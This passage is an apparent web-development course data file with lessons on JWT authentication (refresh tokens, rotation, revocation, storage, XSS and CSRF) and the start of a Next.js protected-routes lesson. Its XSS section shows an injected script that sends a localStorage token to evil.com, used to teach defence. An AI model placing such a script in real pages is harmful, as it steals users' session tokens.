            content: "On the server:"
          },
          {
            type: "flow",
            steps: [
              "Read Authorization Header", "→",
              "Extract Token", "→",
              "Verify Signature", "→",
              "Allow or Reject Request"
            ]
          }
        ]
      },
      {
        heading: "Real-World Example",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an e-commerce platform:"
          },
          {
            type: "flow",
            steps: [
              "Customer", "→",
              "Login", "→",
              "JWT Issued", "→",
              "Browse Products", "→",
              "View Orders", "→",
              "Checkout", "→",
              "Payment", "→",
              "Logout"
            ]
          },
          {
            type: "paragraph",
            content: "Each authenticated request carries the JWT, allowing any server instance to verify the user's identity without consulting a centralized session store."
          }
        ]
      },
      {
        heading: "Common JWT Claims in Practice",
        blocks: [
          {
            type: "table",
            headers: ["Claim", "Purpose", "Example"],
            rows: [
              ["sub", "Unique user ID", "\"user_123\""],
              ["email", "User email", "\"alice@example.com\""],
              ["role", "Authorization role", "\"admin\""],
              ["exp", "Expiration timestamp", "1750000000"],
              ["iat", "Issued at", "1749996400"],
              ["iss", "Token issuer", "\"devsphere\""],
              ["aud", "Intended audience", "\"web-client\""]
            ]
          },
          {
            type: "paragraph",
            content: "Include only the claims your application genuinely needs."
          }
        ]
      },
      {
        heading: "JWT Authentication Architecture",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `                User
                  │
                  ▼
            Login Request
                  │
                  ▼
        Authentication Server
                  │
      Verify Credentials
                  │
                  ▼
           Generate JWT
                  │
        Sign with Secret Key
                  │
                  ▼
          Return Access Token
                  │
                  ▼
        Browser Stores Token
                  │
        Future API Requests
                  │
                  ▼
          Verify JWT Signature
                  │
          Validate Claims
                  │
                  ▼
         Protected Resources`
          }
        ]
      },
      {
        heading: "Advantages of JWT Authentication",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Stateless authentication with no server-side session storage.",
              "Excellent scalability for cloud and microservice architectures.",
              "Ideal for REST APIs, SPAs, and mobile applications.",
              "Fast authentication through cryptographic verification.",
              "Easy integration across multiple services.",
              "Standardized and widely supported.",
              "Supports custom claims for roles and permissions."
            ]
          }
        ]
      },
      {
        heading: "Limitations of JWT Authentication",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Payload is readable (encoded, not encrypted).",
              "Harder to revoke access tokens immediately.",
              "Token size grows with additional claims.",
              "Incorrect handling can introduce security vulnerabilities.",
              "Refresh token management adds complexity.",
              "Requires careful expiration and rotation strategies."
            ]
          }
        ]
      },
      {
        heading: "Summary",
        blocks: [
          {
            type: "paragraph",
            content: "JSON Web Tokens provide a compact, self-contained, and cryptographically signed method for authenticating users without maintaining server-side session state. Understanding their structure, lifecycle, and security properties is essential for building secure modern web applications."
          },
          {
            type: "paragraph",
            content: "In this lesson, you learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "What JWT is and why it was created.",
              "The difference between stateful and stateless authentication.",
              "The three-part structure of a JWT.",
              "The purpose of the Header, Payload, and Signature.",
              "Why encoding is not encryption.",
              "How signing and verification protect token integrity.",
              "The complete token lifecycle.",
              "The differences between Access Tokens and Refresh Tokens.",
              "The login and logout workflows.",
              "Practical code examples for creating, verifying, and using JWTs."
            ]
          }
        ]
      },

      {
        heading: "JWT Authentication — Part 2",
        blocks: [
          {
            type: "paragraph",
            content: "Refresh Tokens, Secure Storage & Production Security"
          },
          {
            type: "paragraph",
            content: "Goal: Learn how production applications securely manage JWTs after login by understanding refresh tokens, token rotation, expiration, revocation, secure storage strategies, common attacks, and best practices for building enterprise-grade authentication systems."
          }
        ]
      },
      {
        heading: "Introduction",
        blocks: [
          {
            type: "paragraph",
            content: "In Part 1, we learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "What JWT is",
              "Why JWT exists",
              "Stateless authentication",
              "JWT structure",
              "Header",
              "Payload",
              "Signature",
              "Access Tokens",
              "Login workflow",
              "Logout workflow"
            ]
          },
          {
            type: "paragraph",
            content: "However, issuing a JWT is only the beginning."
          },
          {
            type: "paragraph",
            content: "The real challenge starts after the user logs in."
          },
          {
            type: "paragraph",
            content: "Questions arise such as:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "What happens when the token expires?",
              "How do users stay logged in for days without repeatedly entering passwords?",
              "Where should tokens be stored?",
              "How do we prevent token theft?",
              "How do we log users out from all devices?",
              "How do large companies like Google, GitHub, Amazon, and Netflix handle JWT authentication securely?"
            ]
          },
          {
            type: "paragraph",
            content: "This lesson answers all of these questions."
          }
        ]
      },
      {
        heading: "Why Access Tokens Should Expire",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose an attacker steals your JWT."
          },
          {
            type: "paragraph",
            content: "If the token never expires:"
          },
          {
            type: "flow",
            steps: [
              "Attacker", "→",
              "Steals JWT", "→",
              "Unlimited Access", "→",
              "Account Compromised"
            ]
          },
          {
            type: "paragraph",
            content: "This is extremely dangerous."
          },
          {
            type: "paragraph",
            content: "Instead, JWTs are intentionally short-lived."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Access Token", "→",
              "15 Minutes", "→",
              "Expires", "→",
              "Cannot Be Used"
            ]
          },
          {
            type: "paragraph",
            content: "Even if stolen, the attack window is limited."
          },
          {
            type: "paragraph",
            content: "This is why short-lived access tokens are a security feature, not a limitation."
          }
        ]
      },
      {
        heading: "Refresh Tokens",
        blocks: [
          {
            type: "paragraph",
            content: "What is a Refresh Token?"
          },
          {
            type: "paragraph",
            content: "A Refresh Token is a long-lived credential used to obtain new Access Tokens without requiring the user to log in again."
          },
          {
            type: "paragraph",
            content: "Think of it as a secure \"renewal pass.\""
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Access Token\nExpires in 15 minutes", "→",
              "Refresh Token\nExpires in 30 days"
            ]
          },
          {
            type: "paragraph",
            content: "The user uses the Refresh Token only when the Access Token expires."
          }
        ]
      },
      {
        heading: "Why Refresh Tokens Exist",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an online banking application."
          },
          {
            type: "paragraph",
            content: "Without Refresh Tokens:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "15 Minutes", "→",
              "Access Token Expires", "→",
              "Login Again"
            ]
          },
          {
            type: "paragraph",
            content: "Users would need to log in every few minutes."
          },
          {
            type: "paragraph",
            content: "Poor user experience."
          },
          {
            type: "paragraph",
            content: "With Refresh Tokens:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Access Token", "→",
              "Expires", "→",
              "Refresh Token", "→",
              "New Access Token", "→",
              "Continue Working"
            ]
          },
          {
            type: "paragraph",
            content: "The user experiences a seamless session."
          }
        ]
      },
      {
        heading: "Access Token vs Refresh Token",
        blocks: [
          {
            type: "table",
            headers: ["Access Token", "Refresh Token"],
            rows: [
              ["Used for API requests", "Used only to obtain new access tokens"],
              ["Short-lived", "Long-lived"],
              ["Sent frequently", "Sent rarely"],
              ["Higher exposure", "Better protected"],
              ["Contains user claims", "Usually opaque or minimal claims"],
              ["Expires quickly", "Can survive longer sessions"]
            ]
          }
        ]
      },
      {
        heading: "Refresh Token Workflow",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Login", "→",
              "Access Token + Refresh Token", "→",
              "API Requests", "→",
              "Access Token Expires", "→",
              "Refresh Request", "→",
              "Validate Refresh Token", "→",
              "Issue New Access Token", "→",
              "Continue"
            ]
          },
          {
            type: "paragraph",
            content: "The user usually never notices this process."
          }
        ]
      },
      {
        heading: "Internal Refresh Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Access Token Invalid", "→",
              "401 Unauthorized", "→",
              "Browser Sends Refresh Token", "→",
              "Authentication Server", "→",
              "Verify Refresh Token", "→",
              "Generate New Access Token", "→",
              "Return New Token", "→",
              "Retry Original Request"
            ]
          },
          {
            type: "paragraph",
            content: "Many authentication libraries automate this process."
          }
        ]
      },
      {
        heading: "Token Rotation",
        blocks: [
          {
            type: "paragraph",
            content: "What is Token Rotation?"
          },
          {
            type: "paragraph",
            content: "Refresh Token Rotation means issuing a new Refresh Token every time the old one is used."
          },
          {
            type: "paragraph",
            content: "Instead of:"
          },
          {
            type: "flow",
            steps: [
              "Refresh Token", "→",
              "Used Forever"
            ]
          },
          {
            type: "paragraph",
            content: "we do:"
          },
          {
            type: "flow",
            steps: [
              "Refresh Token A", "→",
              "Used", "→",
              "Invalidated", "→",
              "Refresh Token B", "→",
              "Used", "→",
              "Invalidated", "→",
              "Refresh Token C"
            ]
          },
          {
            type: "paragraph",
            content: "Every refresh produces a completely new token."
          }
        ]
      },
      {
        heading: "Why Rotation Matters",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an attacker steals a Refresh Token."
          },
          {
            type: "paragraph",
            content: "Without rotation:"
          },
          {
            type: "flow",
            steps: [
              "Attacker", "→",
              "Refresh Forever", "→",
              "Unlimited Access"
            ]
          },
          {
            type: "paragraph",
            content: "With rotation:"
          },
          {
            type: "flow",
            steps: [
              "Refresh Token", "→",
              "Used Once", "→",
              "Invalid", "→",
              "Attacker's Copy", "→",
              "Rejected"
            ]
          },
          {
            type: "paragraph",
            content: "Rotation dramatically reduces replay attacks."
          }
        ]
      },
      {
        heading: "Token Expiration",
        blocks: [
          {
            type: "paragraph",
            content: "Every JWT should contain an expiration time."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "json",
            content: `{
  "exp": 1750000000
}`
          },
          {
            type: "paragraph",
            content: "The server automatically rejects expired tokens."
          }
        ]
      },
      {
        heading: "Short vs Long Expiration",
        blocks: [
          {
            type: "paragraph",
            content: "Typical production values:"
          },
          {
            type: "table",
            headers: ["Token", "Typical Lifetime"],
            rows: [
              ["Access Token", "5–30 minutes"],
              ["Refresh Token", "7–90 days"]
            ]
          },
          {
            type: "paragraph",
            content: "These values depend on security requirements."
          },
          {
            type: "paragraph",
            content: "Banking apps use shorter lifetimes than social media apps."
          }
        ]
      },
      {
        heading: "Expiration Timeline",
        blocks: [
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Access Token (15 min)", "→",
              "Expires", "→",
              "Refresh Token", "→",
              "New Access Token", "→",
              "Continue", "→",
              "Refresh Token Expires", "→",
              "Login Again"
            ]
          }
        ]
      },
      {
        heading: "Token Revocation",
        blocks: [
          {
            type: "paragraph",
            content: "What is Revocation?"
          },
          {
            type: "paragraph",
            content: "Revocation means making a valid token unusable before it naturally expires."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "User Changes Password", "→",
              "Old Tokens", "→",
              "Immediately Invalid"
            ]
          }
        ]
      },
      {
        heading: "When Revocation is Needed",
        blocks: [
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Password changed",
              "Account disabled",
              "User manually logs out",
              "Device stolen",
              "Suspicious activity",
              "Administrator disables account"
            ]
          }
        ]
      },
      {
        heading: "Revocation Workflow",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Logout", "→",
              "Server Revokes Refresh Token", "→",
              "Future Refresh Requests", "→",
              "Rejected"
            ]
          },
          {
            type: "paragraph",
            content: "Access Tokens may still remain valid until expiration unless additional mechanisms are used."
          }
        ]
      },
      {
        heading: "Blacklisting",
        blocks: [
          {
            type: "paragraph",
            content: "One revocation strategy is maintaining a blacklist."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "JWT ID", "→",
              "Blacklist Database", "→",
              "Rejected"
            ]
          },
          {
            type: "paragraph",
            content: "Every request checks:"
          },
          {
            type: "flow",
            steps: [
              "Incoming JWT", "→",
              "JWT ID", "→",
              "Exists in Blacklist?", "→",
              "Yes", "→",
              "Reject"
            ]
          },
          {
            type: "paragraph",
            content: "Pros"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Immediate logout",
              "Immediate revocation",
              "Useful for enterprise security"
            ]
          },
          {
            type: "paragraph",
            content: "Cons"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Requires database lookups",
              "Reduces stateless benefits",
              "Additional infrastructure"
            ]
          }
        ]
      },
      {
        heading: "Storage",
        blocks: [
          {
            type: "paragraph",
            content: "One of the biggest JWT security decisions is:"
          },
          {
            type: "output",
            content: [
              "Where should the token be stored?"
            ]
          },
          {
            type: "paragraph",
            content: "There are three common choices."
          }
        ]
      },
      {
        heading: "HttpOnly Cookies",
        blocks: [
          {
            type: "paragraph",
            content: "The recommended production solution."
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "HttpOnly Cookie", "→",
              "Automatically Sent", "→",
              "Server"
            ]
          },
          {
            type: "paragraph",
            content: "Advantages"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "✔ Protected from JavaScript",
              "✔ Helps prevent token theft through XSS",
              "✔ Automatically included in requests",
              "✔ Works well with Next.js authentication"
            ]
          },
          {
            type: "paragraph",
            content: "Limitations"
          },
          {
            type: "paragraph",
            content: "Requires CSRF protection because browsers automatically attach cookies to requests."
          }
        ]
      },
      {
        heading: "Local Storage",
        blocks: [
          {
            type: "paragraph",
            content: "Many beginners store JWTs here."
          },
          {
            type: "code",
            language: "javascript",
            content: `localStorage.setItem("token", token)`
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Easy",
              "Persistent",
              "Accessible anywhere"
            ]
          },
          {
            type: "paragraph",
            content: "Disadvantages:"
          },
          {
            type: "flow",
            steps: [
              "JavaScript", "→",
              "Reads Token", "→",
              "XSS", "→",
              "Token Theft"
            ]
          },
          {
            type: "paragraph",
            content: "If malicious JavaScript runs, it can steal the token."
          }
        ]
      },
      {
        heading: "Session Storage",
        blocks: [
          {
            type: "code",
            language: "javascript",
            content: `sessionStorage.setItem("token", token)`
          },
          {
            type: "paragraph",
            content: "Characteristics:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Cleared when the browser tab closes",
              "Less persistent",
              "Still accessible through JavaScript"
            ]
          },
          {
            type: "paragraph",
            content: "It has similar XSS risks as Local Storage."
          }
        ]
      },
      {
        heading: "Storage Comparison",
        blocks: [
          {
            type: "table",
            headers: ["Storage", "Persistent", "Accessible to JS", "XSS Risk"],
            rows: [
              ["HttpOnly Cookie", "Yes", "No", "Very Low"],
              ["Local Storage", "Yes", "Yes", "High"],
              ["Session Storage", "Current Tab", "Yes", "High"]
            ]
          },
          {
            type: "paragraph",
            content: "For most production Next.js applications, HttpOnly cookies are the preferred choice."
          }
        ]
      },
      {
        heading: "Token Theft",
        blocks: [
          {
            type: "paragraph",
            content: "JWTs represent authenticated identity."
          },
          {
            type: "paragraph",
            content: "If stolen:"
          },
          {
            type: "flow",
            steps: [
              "Attacker", "→",
              "Uses JWT", "→",
              "Authenticated", "→",
              "Access Granted"
            ]
          },
          {
            type: "paragraph",
            content: "This is why protecting tokens is critical."
          }
        ]
      },
      {
        heading: "Common Causes",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "XSS attacks",
              "Browser extensions",
              "Shared computers",
              "Malicious scripts",
              "Browser vulnerabilities",
              "Logging tokens accidentally",
              "Exposing tokens in URLs"
            ]
          }
        ]
      },
      {
        heading: "Cross-Site Scripting (XSS)",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose your application renders untrusted HTML."
          },
          {
            type: "paragraph",
            content: "An attacker injects:"
          },
          {
            type: "code",
            language: "html",
            content: `<script>
fetch("https://evil.com?token=" + localStorage.token)
</script>`
          },
          {
            type: "paragraph",
            content: "If your token is in Local Storage:"
          },
          {
            type: "flow",
            steps: [
              "Token", "→",
              "JavaScript", "→",
              "Attacker"
            ]
          },
          {
            type: "paragraph",
            content: "Game over."
          }
        ]
      },
      {
        heading: "Why HttpOnly Cookies Help",
        blocks: [
          {
            type: "flow",
            steps: [
              "JavaScript", "→",
              "Cannot Read Cookie", "→",
              "Attack Blocked"
            ]
          },
          {
            type: "paragraph",
            content: "The browser sends the cookie automatically, but JavaScript cannot access its value."
          }
        ]
      },
      {
        heading: "Cross-Site Request Forgery (CSRF)",
        blocks: [
          {
            type: "paragraph",
            content: "Cookies introduce another risk."
          },
          {
            type: "paragraph",
            content: "Suppose you're logged into:"
          },
          {
            type: "output",
            content: [
              "bank.com"
            ]
          },
          {
            type: "paragraph",
            content: "An attacker tricks you into visiting:"
          },
          {
            type: "output",
            content: [
              "evil.com"
            ]
          },
          {
            type: "paragraph",
            content: "The browser automatically sends cookies."
          },
          {
            type: "paragraph",
            content: "Without CSRF protection:"
          },
          {
            type: "flow",
            steps: [
              "evil.com", "→",
              "POST /transfer-money", "→",
              "Cookie Attached", "→",
              "Money Sent"
            ]
          }
        ]
      },
      {
        heading: "CSRF Protection",
        blocks: [
          {
            type: "paragraph",
            content: "Modern applications use:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "CSRF tokens",
              "SameSite cookies",
              "Double-submit cookies",
              "Origin validation"
            ]
          },
          {
            type: "paragraph",
            content: "NextAuth/Auth.js automatically includes CSRF protection for many authentication flows."
          }
        ]
      },
      {
        heading: "Security Best Practices",
        blocks: [
          {
            type: "paragraph",
            content: "Keep Access Tokens Short"
          },
          {
            type: "paragraph",
            content: "Good:"
          },
          {
            type: "output",
            content: [
              "15 Minutes"
            ]
          },
          {
            type: "paragraph",
            content: "Bad:"
          },
          {
            type: "output",
            content: [
              "30 Days"
            ]
          },
          {
            type: "paragraph",
            content: "Rotate Refresh Tokens"
          },
          {
            type: "paragraph",
            content: "Always issue a new Refresh Token after successful use."
          },
          {
            type: "paragraph",
            content: "Store Tokens Securely"
          },
          {
            type: "paragraph",
            content: "Prefer:"
          },
          {
            type: "output",
            content: [
              "HttpOnly Cookies"
            ]
          },
          {
            type: "paragraph",
            content: "Avoid exposing sensitive tokens to JavaScript whenever possible."
          },
          {
            type: "paragraph",
            content: "Always Use HTTPS"
          },
          {
            type: "paragraph",
            content: "Without HTTPS:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Plain Text", "→",
              "Network", "→",
              "Attacker"
            ]
          },
          {
            type: "paragraph",
            content: "HTTPS encrypts communication between client and server."
          },
          {
            type: "paragraph",
            content: "Validate Every Request"
          },
          {
            type: "paragraph",
            content: "Never trust a token without verification."
          },
          {
            type: "paragraph",
            content: "Always check:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Signature",
              "Expiration",
              "Issuer",
              "Audience",
              "Revocation status (if applicable)"
            ]
          },
          {
            type: "paragraph",
            content: "Keep Secrets Secure"
          },
          {
            type: "paragraph",
            content: "Never do:"
          },
          {
            type: "code",
            language: "javascript",
            content: `const SECRET = "password123";`
          },
          {
            type: "paragraph",
            content: "Instead:"
          },
          {
            type: "output",
            content: [
              "process.env.JWT_SECRET"
            ]
          },
          {
            type: "paragraph",
            content: "Rotate Secrets"
          },
          {
            type: "paragraph",
            content: "Long-lived secrets should occasionally be replaced."
          },
          {
            type: "paragraph",
            content: "Large organizations rotate signing keys periodically to reduce long-term risk."
          }
        ]
      },
      {
        heading: "JWT Authentication Architecture",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `                    User
                      │
                      ▼
                  Login Form
                      │
                      ▼
           Authentication Server
                      │
      Verify Credentials (bcrypt)
                      │
                      ▼
     Generate Access + Refresh Token
                      │
                      ▼
         HttpOnly Secure Cookies
                      │
          ┌───────────┴───────────┐
          ▼                       ▼
 Protected APIs             Protected Pages
          │                       │
          ▼                       ▼
    Verify Access Token     Verify Access Token
          │
          ▼
    Token Expired?
          │
     Yes ─┴─ No
      │       │
      ▼       ▼
Verify Refresh  Continue Request
    Token
      │
      ▼
 Issue New Access Token
      │
      ▼
 Continue Session`
          }
        ]
      },
      {
        heading: "Common Mistakes",
        blocks: [
          {
            type: "paragraph",
            content: "Storing JWT in Local Storage for sensitive applications"
          },
          {
            type: "paragraph",
            content: "This increases XSS risk."
          },
          {
            type: "paragraph",
            content: "Long-lived Access Tokens"
          },
          {
            type: "paragraph",
            content: "An attacker gains a longer window if a token is stolen."
          },
          {
            type: "paragraph",
            content: "Never Rotating Refresh Tokens"
          },
          {
            type: "paragraph",
            content: "A stolen Refresh Token remains useful indefinitely."
          },
          {
            type: "paragraph",
            content: "Forgetting HTTPS"
          },
          {
            type: "paragraph",
            content: "Tokens can be intercepted on insecure networks."
          },
          {
            type: "paragraph",
            content: "Including Sensitive Data in Payload"
          },
          {
            type: "paragraph",
            content: "JWT payloads are encoded—not encrypted."
          },
          {
            type: "paragraph",
            content: "Never include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Passwords",
              "Credit card numbers",
              "API secrets",
              "Banking details"
            ]
          },
          {
            type: "paragraph",
            content: "Trusting Client-side Validation"
          },
          {
            type: "paragraph",
            content: "Always verify JWTs on the server."
          },
          {
            type: "paragraph",
            content: "Never trust values supplied by the browser alone."
          },
          {
            type: "paragraph",
            content: "Ignoring Token Revocation"
          },
          {
            type: "paragraph",
            content: "Without revocation or short expirations, compromised accounts remain vulnerable."
          }
        ]
      },
      {
        heading: "DevSphere Special Insight",
        blocks: [
          {
            type: "note",
            content: "One of the biggest misconceptions is that JWT completely replaces sessions. In reality: JWT is a token format. Sessions are an authentication concept. Many modern systems actually combine both: JWT for stateless identity verification. Refresh tokens stored securely in a database. Session metadata for revocation, device tracking, and account management. This hybrid approach offers the scalability of JWTs while retaining the control of server-managed sessions. Another overlooked concept is key rotation. Large organizations periodically rotate JWT signing keys (using mechanisms like JWKS) so that compromised keys can be replaced without disrupting all users. Designing your authentication system with future key rotation in mind is a hallmark of production-ready architecture."
          }
        ]
      },
      {
        heading: "Summary",
        blocks: [
          {
            type: "paragraph",
            content: "JWT authentication enables scalable, stateless authentication by using digitally signed tokens instead of server-side sessions. However, production systems require more than simply issuing tokens—they must manage expiration, secure storage, refresh mechanisms, revocation, and protection against common attacks."
          },
          {
            type: "paragraph",
            content: "In this lesson, you learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Why Refresh Tokens exist and how they work.",
              "How Refresh Token Rotation improves security.",
              "Token expiration strategies.",
              "Token revocation and blacklisting.",
              "Storage options (HttpOnly Cookies, Local Storage, Session Storage).",
              "Token theft risks.",
              "Protection against XSS and CSRF attacks.",
              "Production security best practices.",
              "A scalable JWT authentication architecture.",
              "Common mistakes to avoid."
            ]
          },
          {
            type: "paragraph",
            content: "With Parts 1 and 2 combined, you now have a comprehensive understanding of JWT authentication—from token creation and verification to secure lifecycle management and enterprise-grade deployment practices. The next lessons on Protected Routes, Authorization, and Role-Based Access Control (RBAC) will build directly on this foundation by showing how authenticated identities are used to control access throughout a Next.js application."
          }
        ]
      }
    ]
  },




  /* ===========================
    Fifth Topic : Protected Routes
============================= */
    "nextjs-protected-routes": {
    title: "Protected Routes",
    readingTime: "30 min",
        
    content: [
      {
        heading: "Protected Routes",
        blocks: [
          {
            type: "paragraph",
            content: "Goal: Learn how to protect pages, layouts, APIs, Route Handlers, and application resources in Next.js using modern authentication techniques. By the end of this lesson, you'll understand how protected routes work internally, when to protect on the client vs server, how Middleware fits into the authentication pipeline, and how large production applications secure every request."
          }
        ]
      },
      {
        heading: "Introduction",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication proves who a user is."
          },
          {
            type: "paragraph",
            content: "But authentication alone does not stop unauthorized users from accessing sensitive parts of an application."
          },
          {
            type: "paragraph",
            content: "Imagine an e-commerce application:"
          },
          {
            type: "tree",
            content: `/
├── Home
├── Products
├── About
├── Login
├── Dashboard
├── Orders
├── Profile
├── Admin
└── Settings`
          },
          {
            type: "paragraph",
            content: "Should every visitor access everything?"
          },
          {
            type: "paragraph",
            content: "Obviously not."
          },
          {
            type: "paragraph",
            content: "A visitor who is not logged in should never see:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Dashboard",
              "Orders",
              "Billing",
              "User Profile",
              "Admin Panel"
            ]
          },
          {
            type: "paragraph",
            content: "This is where Protected Routes come in."
          },
          {
            type: "paragraph",
            content: "Protected routes ensure that only authenticated (and sometimes authorized) users can access specific resources."
          }
        ]
      },
      {
        heading: "Why Protected Routes Exist",
        blocks: [
          {
            type: "paragraph",
            content: "Without protection:"
          },
          {
            type: "flow",
            steps: [
              "Internet", "→",
              "/dashboard", "→",
              "Dashboard Opens"
            ]
          },
          {
            type: "paragraph",
            content: "Anyone who knows the URL can access it."
          },
          {
            type: "paragraph",
            content: "This is a major security flaw."
          },
          {
            type: "paragraph",
            content: "With protection:"
          },
          {
            type: "flow",
            steps: [
              "Internet", "→",
              "/dashboard", "→",
              "Authentication Check", "→",
              "Logged In", "→",
              "Dashboard"
            ]
          },
          {
            type: "flow",
            steps: [
              "Authentication Check", "→",
              "Not Logged In", "→",
              "Login Page"
            ]
          },
          {
            type: "paragraph",
            content: "Every secure application follows this principle."
          }
        ]
      },
      {
        heading: "Real-World Examples",
        blocks: [
          {
            type: "paragraph",
            content: "Banking"
          },
          {
            type: "paragraph",
            content: "Protected:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Account balance",
              "Transactions",
              "Money transfer",
              "Credit cards"
            ]
          },
          {
            type: "paragraph",
            content: "Public:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Home page",
              "Interest rates",
              "Contact page"
            ]
          },
          {
            type: "paragraph",
            content: "Social Media"
          },
          {
            type: "paragraph",
            content: "Protected:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Messages",
              "Notifications",
              "Profile editing",
              "Followers list"
            ]
          },
          {
            type: "paragraph",
            content: "Public:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Landing page",
              "Signup",
              "Login"
            ]
          },
          {
            type: "paragraph",
            content: "E-commerce"
          },
          {
            type: "paragraph",
            content: "Protected:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Cart",
              "Checkout",
              "Orders",
              "Wishlist"
            ]
          },
          {
            type: "paragraph",
            content: "Public:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Products",
              "Search",
              "Categories"
            ]
          }
        ]
      },
      {
        heading: "What is a Protected Route?",
        blocks: [
          {
            type: "paragraph",
            content: "A protected route is simply a route that performs an authentication check before returning its content."
          },
          {
            type: "paragraph",
            content: "Instead of:"
          },
          {
            type: "flow",
            steps: [
              "Request", "→",
              "Render Page"
            ]
          },
          {
            type: "paragraph",
            content: "It becomes:"
          },
          {
            type: "flow",
            steps: [
              "Request", "→",
              "Authentication", "→",
              "Authorized?", "→",
              "Yes → Render", "→",
              "No → Redirect"
            ]
          }
        ]
      },
      {
        heading: "Authentication Guards",
        blocks: [
          {
            type: "paragraph",
            content: "An authentication guard is code responsible for deciding whether a request should continue."
          },
          {
            type: "paragraph",
            content: "Think of it as a security guard."
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Protected Route", "→",
              "Authentication Guard", "→",
              "Verified?", "→",
              "Yes → Continue\n\nNo → Reject"
            ]
          },
          {
            type: "paragraph",
            content: "The guard can exist in different places."
          }
        ]
      },
      {
        heading: "Where Can Protection Happen?",
        blocks: [
          {
            type: "paragraph",
            content: "In Next.js, protection can happen at several layers."
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Middleware", "→",
              "Server Component", "→",
              "Layout", "→",
              "Route Handler", "→",
              "Database"
            ]
          },
          {
            type: "paragraph",
            content: "The earlier the protection occurs, the better."
          }
        ]
      },
      {
        heading: "Route Protection Workflow",
        blocks: [
          {
            type: "paragraph",
            content: "A complete protected request looks like this:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Request", "→",
              "Middleware", "→",
              "Read Session/JWT", "→",
              "Valid?", "→",
              "Yes", "→",
              "Server Component", "→",
              "Database", "→",
              "Render HTML", "→",
              "Browser"
            ]
          },
          {
            type: "paragraph",
            content: "If authentication fails:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Middleware", "→",
              "Authentication Failed", "→",
              "Redirect Login"
            ]
          },
          {
            type: "paragraph",
            content: "No sensitive data is ever rendered."
          }
        ]
      },
      {
        heading: "Server-side Protection",
        blocks: [
          {
            type: "paragraph",
            content: "Server-side protection is the most secure approach."
          },
          {
            type: "paragraph",
            content: "Instead of trusting the browser, the server validates authentication before generating the page."
          },
          {
            type: "flow",
            steps: [
              "Request", "→",
              "Server", "→",
              "Verify Session", "→",
              "Authenticated?", "→",
              "Yes", "→",
              "Generate HTML", "→",
              "Browser"
            ]
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Secure",
              "SEO-friendly",
              "Prevents data leakage",
              "Faster redirects",
              "No flashing content"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `import { redirect } from "next/navigation";
import { auth } from "@/auth";

export default async function Dashboard() {
  const session = await auth();

  if (!session) {
    redirect("/login");
  }

  return <h1>Dashboard</h1>;
}`
          },
          {
            type: "paragraph",
            content: "This is the recommended approach in the App Router."
          }
        ]
      },
      {
        heading: "Why Server Protection is Better",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine protecting only in the browser."
          },
          {
            type: "flow",
            steps: [
              "Request", "→",
              "Server Sends Secret Page", "→",
              "Browser Loads", "→",
              "JavaScript Redirects"
            ]
          },
          {
            type: "paragraph",
            content: "Even though the user is redirected, the sensitive HTML has already been delivered."
          },
          {
            type: "paragraph",
            content: "Server protection avoids this."
          },
          {
            type: "flow",
            steps: [
              "Request", "→",
              "Authentication", "→",
              "Redirect", "→",
              "No Sensitive HTML"
            ]
          }
        ]
      },
      {
        heading: "Client-side Protection",
        blocks: [
          {
            type: "paragraph",
            content: "Sometimes authentication depends on client-side state."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `"use client";

